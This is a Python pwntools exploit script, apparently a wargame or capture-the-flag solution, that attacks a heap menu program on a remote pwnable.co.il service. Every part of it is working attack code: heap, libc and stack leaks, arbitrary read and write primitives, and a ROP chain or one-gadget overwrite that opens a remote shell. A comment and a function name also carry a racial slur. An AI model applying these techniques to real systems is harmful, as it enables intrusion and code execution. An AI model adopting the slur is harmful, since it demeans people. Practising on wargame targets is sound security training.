from pwn import *

#offsets
MAIN_ARENA_OFFSET = 0x00000000003b4b60
ENVIRON_OFFSET = 0x00000000003b75d8
SYSTEM_OFFSET = 0x0000000000043200
ONE_GADGET_OFFSET = 0xc4ddf
BINSH_OFFSET = 0x17c6b7

#gadgets
POP_RSP = 0x00000000000039d0
POP_RDI = 0x0000000000021a02

#globals
YES = 'y'
NO = 'n'

def send_option(p: process, option: int):
    p.sendline(str(option))

def new_creature(p: process, index: int = 0, size: int = 1, data: str = "", type: int = 1, cls: bool = True):
    send_option(p, 1)
    p.sendline(str(index))
    p.sendline(str(type))
    p.sendline(str(size))
    p.sendline(data)
    if cls:
        p.recvuntil("Exit")

def get_name(p: process, index: int = 0):
    send_option(p, 5)
    p.recv(2048)
    p.sendline(str(index))
    p.recvuntil("Name: ")
    name = p.recvuntil('New')[:-3]
    p.sendline("n")
    p.recvuntil("Exit")
    return name

def new_name(p: process, index: int, size: int = 1, data = "", cls: bool = True):
    send_option(p, 5)
    p.sendline(str(index))
    p.sendline(YES)
    p.sendline(str(size))
    p.sendline(data)
    if cls:
        p.recvuntil("Exit")

def edit_name(p: process, index: int, data: str = "", cls: bool = True):
    send_option(p, 2)
    p.sendline(str(index))
    p.sendline(data)
    if cls:
        p.recvuntil("Exit")

def del_creature(p: process, index: int = 0, cls: bool = True):
    send_option(p, 3)
    p.sendline(str(index))
    if cls:
        p.recvuntil("Exit")

def leak_heap(p: process):
    new_creature(p, 0)
    new_creature(p, 1)
    del_creature(p, 0)
    new_name(p, 1, 17, b"a" * 7)
    heap_base = int.from_bytes(get_name(p, 1)[8:], 'little') - 0x30
    print("heap: ", hex(heap_base))
    del_creature(p, 1)
    return heap_base

def arbitrary_read(p: process, addr: int):
    new_creature(p, 3)
    new_creature(p, 4)
    del_creature(p, 3)
    new_name(p, 4, 16, b"a" * 8 + p64(addr))
    p.recv(2048)
    return int.from_bytes(get_name(p, 3), 'little')

def arbitrary_write(p: process, addr: int, data: str):
    new_creature(p, 6, cls = False)
    new_creature(p, 7, cls = False)
    del_creature(p, 6, cls = False)
    new_name(p, 7, 16, b"a" * 8 + p64(addr), cls = False)
    edit_name(p, 6, data, cls = False)

def leak_libc(p: process, heap_base: int):
    new_creature(p, 0, 0x200)
    new_creature(p, 1, 0x200)
    new_creature(p, 2, 0x200)
    del_creature(p, 0)
    del_creature(p, 1)
    del_creature(p, 3)
    libc = arbitrary_read(p, heap_base + 0xb0) - MAIN_ARENA_OFFSET - 0x60
    print("libc: ", hex(libc))
    return libc

def leak_stack(p: process, libc: int):
    stack = arbitrary_read(p, libc + ENVIRON_OFFSET)
    print("stack: ", hex(stack))
    return stack

#work only localy :(
def cool_payload(p: process, function_stack: int, stack: int, libc: int):
    arbitrary_write(p, function_stack + 8, p64(stack))
    arbitrary_write(p, stack, p64(libc + POP_RDI))
    arbitrary_write(p, stack + 8, p64(libc + BINSH_OFFSET))
    arbitrary_write(p, stack + 16, p64(libc + SYSTEM_OFFSET))
    arbitrary_write(p, function_stack, p64(libc + POP_RSP))
    p.interactive()

#payload for niggers but work also remotly
def nigga_payload(p: process, function_stack: int, libc: int):
    arbitrary_write(p, function_stack, p64(libc + ONE_GADGET_OFFSET))
    p.interactive()

def main():
    ### run ###
    p = remote("pwnable.co.il", 9007)
    p.recvuntil("Exit")

    ### leaks ###
    heap_base = leak_heap(p)
    libc = leak_libc(p, heap_base)
    stack = leak_stack(p, libc)
    function_stack = stack - 0x110

    ### payload start ###
    print("function stack: ", hex(function_stack)) #LOG
    nigga_payload(p, function_stack, libc)

if __name__ == "__main__":
    main()